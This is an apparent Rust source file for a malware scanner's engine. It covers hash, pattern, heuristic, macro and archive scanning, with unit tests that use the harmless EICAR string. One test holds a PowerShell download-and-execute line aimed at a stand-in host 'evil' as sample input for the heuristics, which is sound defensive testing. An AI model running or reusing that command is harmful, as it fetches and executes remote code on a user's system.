//! The scanning engine: combines hash signatures, pattern rules, heuristics,
//! macro extraction and recursive archive inspection into a single verdict per
//! object.

use std::path::Path;

use ello_common::config::{ScanConfig, Sensitivity as CfgSensitivity};
use ello_common::{Confidence, Detection, DetectionKind, ScanOutcome};
use sha2::{Digest, Sha256};

use crate::archive::{self, Limits};
use crate::filetype::{self, FileType};
use crate::heuristics::{self, Sensitivity};
use crate::ole;
use crate::sigdb::SignatureDb;

/// Maps the user-facing sensitivity onto the heuristics engine's.
fn map_sensitivity(s: CfgSensitivity) -> Sensitivity {
    match s {
        CfgSensitivity::Off => Sensitivity::Off,
        CfgSensitivity::Low => Sensitivity::Low,
        CfgSensitivity::Normal => Sensitivity::Normal,
        CfgSensitivity::High => Sensitivity::High,
    }
}

pub struct Engine {
    db: SignatureDb,
    sensitivity: Sensitivity,
    limits: Limits,
    max_file_size: u64,
    skip_extensions: Vec<String>,
}

impl Engine {
    pub fn new(db: SignatureDb, cfg: &ScanConfig) -> Self {
        Engine {
            db,
            sensitivity: map_sensitivity(cfg.heuristic_sensitivity),
            limits: Limits {
                max_depth: cfg.max_archive_depth,
                max_total_output: cfg.max_archive_output,
                max_entry_output: cfg.max_file_size.max(1),
                max_entries: 100_000,
            },
            max_file_size: cfg.max_file_size,
            skip_extensions: cfg
                .skip_extensions
                .iter()
                .map(|s| s.to_ascii_lowercase())
                .collect(),
        }
    }

    /// Convenience constructor with default scan settings.
    pub fn with_db(db: SignatureDb) -> Self {
        Engine::new(db, &ScanConfig::default())
    }

    pub fn db(&self) -> &SignatureDb {
        &self.db
    }

    pub fn signature_version(&self) -> u64 {
        self.db.version()
    }

    /// Scans a file on disk.
    pub fn scan_file(&self, path: &Path) -> ScanOutcome {
        let meta = match std::fs::metadata(path) {
            Ok(m) => m,
            Err(e) => {
                return ScanOutcome {
                    path: path.into(),
                    detections: vec![],
                    error: Some(e.to_string()),
                }
            }
        };
        if self.max_file_size != 0 && meta.len() > self.max_file_size {
            return ScanOutcome {
                path: path.into(),
                detections: vec![],
                error: Some("skipped".into()),
            };
        }
        let ext = filetype::extension_of(&path.to_string_lossy());
        if self.skip_extensions.contains(&ext) {
            return ScanOutcome {
                path: path.into(),
                detections: vec![],
                error: Some("skipped".into()),
            };
        }
        match std::fs::read(path) {
            Ok(data) => {
                let name = path.to_string_lossy().into_owned();
                let mut budget = 0u64;
                let detections = self.scan_bytes(&name, &data, 0, &mut budget);
                ScanOutcome {
                    path: path.into(),
                    detections,
                    error: None,
                }
            }
            Err(e) => ScanOutcome {
                path: path.into(),
                detections: vec![],
                error: Some(e.to_string()),
            },
        }
    }

    /// Scans a raw buffer. `name` is used for file-name heuristics and for
    /// labelling nested objects. `depth` bounds archive recursion.
    pub fn scan_bytes(
        &self,
        name: &str,
        data: &[u8],
        depth: u32,
        budget: &mut u64,
    ) -> Vec<Detection> {
        let mut out = Vec::new();

        // 1. Exact hash signature (most authoritative).
        let digest: [u8; 32] = Sha256::digest(data).into();
        if let Some(threat) = self.db.lookup_hash(&digest) {
            out.push(Detection {
                name: threat.to_string(),
                kind: DetectionKind::Hash,
                confidence: Confidence::Known,
                reasons: vec![format!("sha256 {}", hex::encode(digest))],
                inner_path: None,
            });
        }

        let ft = filetype::detect(name, data);

        // 2. Pattern-rule signatures.
        for hit in self.db.match_rules(data, ft) {
            out.push(Detection {
                name: hit.name.clone(),
                kind: DetectionKind::Pattern,
                confidence: Confidence::Malicious,
                reasons: vec![format!("matched {}/{} patterns", hit.matched, hit.total)],
                inner_path: None,
            });
        }

        // 3. Heuristics.
        if let Some(det) = self.run_heuristics(name, data, ft) {
            out.push(det);
        }

        // 4. Recurse into containers (bounded by depth and output budget).
        if depth < self.limits.max_depth && archive::is_zip(data) {
            out.extend(self.scan_archive(data, depth, budget));
        }

        out
    }

    fn run_heuristics(&self, name: &str, data: &[u8], ft: FileType) -> Option<Detection> {
        let (malicious, suspicious) = self.sensitivity.thresholds()?;
        let mut findings = heuristics::filename_tricks(name);
        let script_like = ft == FileType::Script;
        findings.extend(heuristics::string_indicators(data, script_like));
        if ft == FileType::Pdf {
            findings.extend(heuristics::pdf(data));
        }
        // Legacy Office documents and standalone vbaProject.bin: inspect macros.
        if ft == FileType::Ole {
            if let Some(src) = ole::extract_vba(data) {
                let mut macro_findings = heuristics::string_indicators(src.as_bytes(), true);
                if !macro_findings.is_empty() {
                    findings.push(heuristics::Finding::new(
                        15,
                        "Macro",
                        "document contains an auto-executing VBA project",
                    ));
                }
                findings.append(&mut macro_findings);
            }
        }

        let score = heuristics::total_score(&findings);
        let confidence = if score >= malicious {
            Confidence::Malicious
        } else if score >= suspicious {
            Confidence::Suspicious
        } else {
            return None;
        };
        let tag = heuristics::dominant_tag(&findings);
        let mut reasons: Vec<String> = findings
            .iter()
            .filter(|f| f.score > 0)
            .map(|f| f.reason.clone())
            .collect();
        reasons.sort();
        reasons.dedup();
        reasons.insert(0, format!("heuristic score {score}"));
        Some(Detection {
            name: format!("Heuristic.{tag}"),
            kind: DetectionKind::Heuristic,
            confidence,
            reasons,
            inner_path: None,
        })
    }

    fn scan_archive(&self, data: &[u8], depth: u32, budget: &mut u64) -> Vec<Detection> {
        // Extract members first (bounded by the shared output budget), then
        // recurse, so the budget is not aliased by the extraction closure.
        let mut members = Vec::new();
        archive::extract_zip(data, &self.limits, budget, |m| members.push(m));
        let mut nested = Vec::new();
        for member in members {
            for mut d in self.scan_bytes(&member.name, &member.data, depth + 1, budget) {
                d.inner_path = Some(match d.inner_path {
                    Some(p) => format!("{}!{}", member.name, p),
                    None => member.name.clone(),
                });
                nested.push(d);
            }
        }
        nested
    }
}

/// Builds an [`Engine`] from a signature file path and scan config, falling
/// back to an empty database (heuristics only) when the file is absent.
pub fn load_engine(sig_path: &Path, cfg: &ScanConfig) -> Result<Engine, crate::sigdb::SigDbError> {
    let db = match std::fs::read_to_string(sig_path) {
        Ok(text) => SignatureDb::parse(&text)?,
        Err(_) => SignatureDb::default(),
    };
    Ok(Engine::new(db, cfg))
}

/// The canonical EICAR anti-malware test string. Not a virus; used to verify
/// that scanning and quarantine are wired up correctly.
pub const EICAR: &[u8] = br#"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"#;

pub fn eicar_sha256_hex() -> String {
    hex::encode::<[u8; 32]>(Sha256::digest(EICAR).into())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn eicar_db() -> SignatureDb {
        SignatureDb::parse(&format!(
            "@version 1\nH {} EICAR-Test-File\n",
            eicar_sha256_hex()
        ))
        .unwrap()
    }

    #[test]
    fn detects_eicar_by_hash() {
        let eng = Engine::with_db(eicar_db());
        let mut b = 0;
        let d = eng.scan_bytes("eicar.com", EICAR, 0, &mut b);
        assert_eq!(d.len(), 1);
        assert_eq!(d[0].confidence, Confidence::Known);
        assert_eq!(d[0].name, "EICAR-Test-File");
    }

    #[test]
    fn detects_malicious_script_by_heuristics() {
        let eng = Engine::with_db(SignatureDb::default());
        let script = b"powershell -nop -w hidden -enc aAByAHQAdABwAA== ; IEX (New-Object Net.WebClient).DownloadString('http://evil/x')";
        let mut b = 0;
        let d = eng.scan_bytes("update.ps1", script, 0, &mut b);
        assert_eq!(d.len(), 1, "{d:?}");
        assert_eq!(d[0].kind, DetectionKind::Heuristic);
        assert!(d[0].name.starts_with("Heuristic."));
    }

    #[test]
    fn clean_file_has_no_detections() {
        let eng = Engine::with_db(eicar_db());
        let mut b = 0;
        assert!(eng
            .scan_bytes(
                "readme.txt",
                b"This is a perfectly ordinary text file.\n",
                0,
                &mut b
            )
            .is_empty());
    }

    #[test]
    fn finds_threat_inside_zip() {
        use std::io::Write;
        use zip::write::SimpleFileOptions;
        let mut buf = Vec::new();
        {
            let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
            w.start_file("payload/eicar.com", SimpleFileOptions::default())
                .unwrap();
            w.write_all(EICAR).unwrap();
            w.finish().unwrap();
        }
        let eng = Engine::with_db(eicar_db());
        let mut b = 0;
        let d = eng.scan_bytes("mail.zip", &buf, 0, &mut b);
        assert_eq!(d.len(), 1);
        assert_eq!(d[0].inner_path.as_deref(), Some("payload/eicar.com"));
        assert_eq!(d[0].confidence, Confidence::Known);
    }

    #[test]
    fn respects_depth_limit() {
        // Nest zips deeper than the limit and ensure we stop (no panic/hang).
        use std::io::Write;
        use zip::write::SimpleFileOptions;
        let mut inner = EICAR.to_vec();
        for i in 0..12 {
            let mut buf = Vec::new();
            {
                let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
                w.start_file(format!("lvl{i}.zip"), SimpleFileOptions::default())
                    .unwrap();
                w.write_all(&inner).unwrap();
                w.finish().unwrap();
            }
            inner = buf;
        }
        let cfg = ScanConfig {
            max_archive_depth: 3,
            ..Default::default()
        };
        let eng = Engine::new(eicar_db(), &cfg);
        let mut b = 0;
        // Should not find the deeply-buried eicar (beyond depth 3).
        let d = eng.scan_bytes("deep.zip", &inner, 0, &mut b);
        assert!(d.is_empty());
    }
}
